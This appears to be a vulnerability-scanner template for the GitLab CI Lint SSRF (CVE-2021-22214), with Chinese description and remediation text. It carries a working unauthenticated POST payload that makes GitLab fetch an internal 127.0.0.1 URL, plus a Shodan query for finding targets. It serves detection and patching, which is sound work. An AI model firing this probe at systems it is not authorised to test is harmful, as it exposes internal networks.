id: CVE-2021-22214
info:
  name: Unauthenticated Gitlab SSRF - CI Lint API
  author:
  - l0ne1y
  tags:
  - cve
  - cve2021
  - gitlab
  - ssrf
  description: |-
    Gitlab 服务端请求伪造(ssrf)漏洞
    GitLab是美国GitLab公司的一款使用Ruby on Rails开发的、自托管的、Git（版本控制系统）项目仓库应用程序。该程序可用于查阅项目的文件内容、提交历史、Bug列表等。

    GitLab CE EE存在安全漏洞，该漏洞源于当对内部网络的webhook请求被启用时存在请求伪造漏洞。
  reference:
  - https://nvd.nist.gov/vuln/detail/cve-2021-22214
  - https://nvd.nist.gov/vuln/detail/cve-2021-39935
  - https://nvd.nist.gov/vuln/detail/cve-2021-22175
  - https://vin01.github.io/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html
  - https://docs.gitlab.com/ee/api/lint.html
  severity: high
  metadata:
    shodan-query: http.title:"GitLab"
  classification:
    cve-id:
    - cve-2021-22214
    - cve-2021-39935
    - cve-2021-22175
    cwe-id:
    - cwe-918
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
  remediation: |
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：
    https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22214.json

    **临时修复方案**
    1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。
    2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
    3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。
    4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。
    5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
requests:
- matchers:
  - type: word
    part: body
    words:
    - does not have valid YAML syntax
  path:
  - '{{BaseURL}}/api/v4/ci/lint?include_merged_yaml=true'
  method: POST
  body: |
    {"content": "include:\n  remote: http://127.0.0.1:9100/test.yml"}
  headers:
    Content-Type: application/json
  max-redirects: 3
  redirects: true
